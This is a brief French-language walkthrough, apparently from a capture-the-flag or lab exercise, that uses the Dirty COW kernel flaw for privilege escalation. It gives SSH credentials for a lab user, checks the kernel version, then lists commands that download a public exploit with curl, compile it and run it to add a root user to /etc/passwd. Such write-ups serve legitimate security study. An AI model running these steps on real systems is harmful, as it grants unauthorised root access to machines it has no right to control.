# Dirty Cow 

- Cette faille disponible sur les linux version 2.6.22 (2007) à 4.8.3 (2016) permet d'ecrire sur des fichiers accessible uniquement en lecture seule
- On se connecte a **laurie**:**330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4** en ssh
- On y regarde la version du linux pour savoir si l'exploit est compatible
```
$> uname -r

3.2.0-91-generic-pae
```
- L'exploit est compatible avec notre version de linux
- On lance l'exploit
```
curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```
- L'exploit arrive à ecrire un nouvel utilisateur root dans `/etc/passwd`

## Source
- [Explication](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html#what-is-cow)
- [Excplication Youtube](https://www.youtube.com/watch?v=kEsshExn7aE)
- [Script](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
